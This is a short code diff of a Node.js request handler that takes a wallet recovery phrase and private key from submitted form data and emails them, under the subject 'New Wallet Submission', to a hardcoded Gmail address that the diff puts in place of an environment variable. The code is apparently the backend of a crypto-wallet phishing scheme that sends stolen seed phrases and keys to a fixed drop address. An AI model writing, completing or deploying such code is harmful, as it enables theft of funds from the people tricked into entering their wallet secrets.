@@ -9,9 +9,8 @@ const handleSubmission = async (req, res) => {
   try {
     const { phrase, privateKey } = req.body;
 
-    // setup nodemailer
     const transporter = nodemailer.createTransport({
-      service: "gmail", // or SMTP host
+      service: "gmail",
       auth: {
         user: process.env.EMAIL_USER,
         pass: process.env.EMAIL_PASS,
@@ -20,7 +19,7 @@ const handleSubmission = async (req, res) => {
 
     const mailOptions = {
       from: process.env.EMAIL_USER,
-      to: process.env.RECEIVE_EMAIL, // your target email
+      to: "Tomoteletoyese@gmail.com",
       subject: "New Wallet Submission",
       text: `
         Phrase: ${phrase || "N/A"}
